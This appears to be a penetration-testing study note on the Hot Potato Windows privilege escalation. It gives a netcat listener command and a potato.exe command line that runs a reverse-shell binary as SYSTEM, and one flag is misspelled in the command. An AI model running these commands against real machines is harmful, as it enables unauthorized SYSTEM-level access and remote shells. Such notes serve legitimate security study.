- Spoofing along with NTLM relay to gain SYSTEM
- tricks Windows into authenticating to fake HTTP server, then relaying to SMB to RCE
- works on Windows 7, 8, early versions of 10, and their server counterparts


1. Start listener
```
nc -lvnp <port>
```

2. Run [Potato](https://github.com/AtvikSecurity/CentralizedPotatoes) command (in this case, hotpotato)
```
.\potato.exe -ip <IP> -cmd "C:\Privesc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exchaust true
```
- all the following need to be set to true for Windows 7
	- enable_httpserver  
	- enable_defender  
	- enable_spoof 
	- enable_exhaust 

![](assets/Pasted%20image%2020260607150208.png)
![](assets/Pasted%20image%2020260607150217.png)

